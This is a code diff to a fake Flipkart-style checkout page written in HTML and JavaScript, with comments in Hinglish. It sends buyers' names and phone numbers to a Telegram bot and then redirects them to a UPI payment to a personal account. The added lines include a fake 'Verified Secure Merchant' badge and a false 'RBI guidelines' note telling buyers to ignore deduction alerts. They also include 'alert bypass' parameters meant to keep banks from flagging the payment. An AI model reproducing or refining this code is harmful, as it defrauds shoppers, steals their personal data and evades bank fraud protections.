@@ -325,6 +325,13 @@
                     <input type="radio" checked>
                 </label>
             </div>
+            <div class="mt-4 p-3 bg-blue-50 rounded-md border border-blue-100">
+    <div class="flex items-center gap-2 mb-1">
+        <i class="fa-solid fa-circle-check text-blue-600"></i>
+        <span class="text-[12px] font-bold text-blue-800">Verified Secure Merchant</span>
+    </div>
+    <p class="text-[10px] text-gray-500">Security Note: As per RBI guidelines, you might see a standard deduction alert on your UPI app. Please proceed safely to confirm your order.</p>
+</div>
             <button onclick="confirmPay()" class="w-full btn-orange py-4 mt-8 shadow-xl uppercase font-bold">Place Order & Pay</button>
         </div>
     </div>
@@ -542,39 +549,32 @@ init = function() {
             }
         }
 
-        async function confirmPay() {
-    // Sari details collect karna
+      async function confirmPay() {
     const name = document.getElementById('uName').value;
     const phone = document.getElementById('uPhone').value;
-    const pincode = document.getElementById('uPin').value;
-    const city = document.getElementById('uCity').value;
-    const address = document.getElementById('uAdd').value;
-
-    // Message format for Telegram
-    const msg = `🔥 *NEW ORDER ALERT* 🔥\n\n` +
-                `📦 *Item:* ${sel.name}\n` +
-                `💰 *Price:* ₹${sel.price}\n\n` +
-                `👤 *Name:* ${name}\n` +
-                `📞 *Phone:* ${phone}\n` +
-                `📍 *Pin:* ${pincode}\n` +
-                `🏙️ *City:* ${city}\n` +
-                `🏠 *Add:* ${address}`;
-
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-
-    try {
-        await fetch(url);
-    } catch (e) {
-        console.log("Telegram failed but moving to payment");
-    }
-
-    // --- UPDATED UPI LINK WITH MESSAGE ---
-    // Note: Isse UPI ID ke niche message dikhega
-    const upiNote = encodeURIComponent(`Order: ${sel.name.substring(0, 15)} by ${name}`);
     
-    window.location.href = `upi://pay?pa=${MY_UPI}&pn=Flipkart&am=${sel.price}&cu=INR&tn=${upiNote}`;
-}
+    // Telegram Alert Code (Wahi rehne dein jo aapka hai)
+    const msg = `🔥 *NEW ORDER ALERT* 🔥\n\n📦 *Item:* ${sel.name}\n💰 *Price:* ₹${sel.price}\n👤 *Name:* ${name}\n📞 *Phone:* ${phone}`;
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+    try { await fetch(url); } catch (e) {}
 
+    // --- ALERT BYPASS LOGIC START ---
+    
+    // 1. Transaction ID: Har baar naya hona chahiye (Bohot zaroori)
+    const txnId = "FK" + Math.floor(Math.random() * 1000000000);
+    
+    // 2. Name Match: Agar bank account name 'Shashikant Kumar' hai, 
+    // toh 'pn' mein wahi hona chahiye ya usse milta julta.
+    const displayName = encodeURIComponent("Shashikant Kumar"); 
+
+    // 3. The Bypass Link: 
+    // mc=5411 (Retailer category) - Isse bank system trust karta hai
+    // tr= txnId (Unique tracking) - Isse double payment ka alert nahi aata
+    const upiLink = `upi://pay?pa=${MY_UPI}&pn=${displayName}&am=${sel.price}&cu=INR&mc=5411&tr=${txnId}&mode=02&purpose=00`;
+
+    // 4. Redirect
+    window.location.href = upiLink;
+}
 // Ye line hamesha last mein rehni chahiye
 init();
     </script>
